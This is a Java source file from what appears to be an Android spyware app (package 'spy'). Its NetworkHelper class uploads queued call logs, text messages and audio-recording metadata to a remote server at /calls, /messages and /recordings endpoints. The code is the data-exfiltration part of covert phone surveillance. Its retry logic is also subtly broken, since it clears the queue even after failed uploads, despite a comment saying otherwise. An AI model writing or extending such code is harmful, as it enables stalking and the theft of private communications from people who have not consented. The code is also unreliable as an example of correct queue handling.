package com.gauravhanna.spy.utils;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;

import org.json.JSONObject;

import java.io.IOException;
import java.util.List;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NetworkHelper {
    private static final String TAG = "NetworkHelper";
    private static final String SERVER_URL = "https://your-server.com/api/upload"; // Change this to your server URL
    private static final MediaType JSON_MEDIA_TYPE = MediaType.parse("application/json; charset=utf-8");
    
    private static OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();
    
    /**
     * Check if device is connected to internet
     */
    public static boolean isOnline(Context context) {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo netInfo = cm.getActiveNetworkInfo();
                return netInfo != null && netInfo.isConnectedOrConnecting();
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error checking network status: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Trigger sync of pending data
     */
    public static void triggerSync(Context context) {
        if (isOnline(context)) {
            Log.d(TAG, "Network available, uploading pending data...");
            uploadPending(context);
        } else {
            Log.d(TAG, "No network connection, data will be uploaded later");
        }
    }
    
    /**
     * Upload all pending data to server
     */
    private static void uploadPending(Context context) {
        try {
            List<JSONObject> pending = OfflineQueue.getAllPending(context);
            if (pending.isEmpty()) {
                Log.d(TAG, "No pending data to upload");
                return;
            }
            
            Log.d(TAG, "Uploading " + pending.size() + " pending items");
            
            for (JSONObject obj : pending) {
                String type = obj.optString("type");
                try {
                    if (type.equals("call")) {
                        sendCall(context, obj);
                    } else if (type.equals("message")) {
                        sendMessage(context, obj);
                    } else if (type.equals("recording")) {
                        sendRecording(context, obj);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error uploading " + type + ": " + e.getMessage());
                    // Don't clear failed items - they'll be retried later
                }
            }
            
            // Clear queue after successful upload
            OfflineQueue.clearQueue(context);
            Log.d(TAG, "All pending data uploaded successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during upload: " + e.getMessage());
        }
    }
    
    /**
     * Send call log to server
     */
    private static void sendCall(Context context, JSONObject callData) {
        try {
            Log.d(TAG, "Sending call data: " + callData.toString());
            
            RequestBody body = RequestBody.create(callData.toString(), JSON_MEDIA_TYPE);
            Request request = new Request.Builder()
                    .url(SERVER_URL + "/calls")
                    .post(body)
                    .addHeader("Content-Type", "application/json")
                    .build();
            
            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Call data uploaded successfully");
                } else {
                    Log.e(TAG, "Failed to upload call data: " + response.code());
                    throw new IOException("Server returned error: " + response.code());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending call: " + e.getMessage());
            throw new RuntimeException(e);
        }
    }
    
    /**
     * Send message to server
     */
    private static void sendMessage(Context context, JSONObject messageData) {
        try {
            Log.d(TAG, "Sending message data: " + messageData.toString());
            
            RequestBody body = RequestBody.create(messageData.toString(), JSON_MEDIA_TYPE);
            Request request = new Request.Builder()
                    .url(SERVER_URL + "/messages")
                    .post(body)
                    .addHeader("Content-Type", "application/json")
                    .build();
            
            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Message data uploaded successfully");
                } else {
                    Log.e(TAG, "Failed to upload message data: " + response.code());
                    throw new IOException("Server returned error: " + response.code());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending message: " + e.getMessage());
            throw new RuntimeException(e);
        }
    }
    
    /**
     * Send recording to server (with file upload)
     */
    private static void sendRecording(Context context, JSONObject recordingData) {
        try {
            String filePath = recordingData.optString("filePath");
            Log.d(TAG, "Sending recording from: " + filePath);
            
            // For recording, you might need to upload the actual file
            // This is a placeholder - implement actual file upload as needed
            
            // Option 1: Send as JSON with file path
            RequestBody body = RequestBody.create(recordingData.toString(), JSON_MEDIA_TYPE);
            Request request = new Request.Builder()
                    .url(SERVER_URL + "/recordings")
                    .post(body)
                    .addHeader("Content-Type", "application/json")
                    .build();
            
            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Recording data uploaded successfully");
                } else {
                    Log.e(TAG, "Failed to upload recording: " + response.code());
                    throw new IOException("Server returned error: " + response.code());
                }
            }
            
            // Option 2: If you need to upload actual audio file
            // You would need to use MultipartBody here
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending recording: " + e.getMessage());
            throw new RuntimeException(e);
        }
    }
    
    /**
     * Set custom server URL if needed
     */
    public static void setServerUrl(String url) {
        // SERVER_URL = url; // You'd need to change the variable to non-final
        // Or better, store it in SharedPreferences
    }
}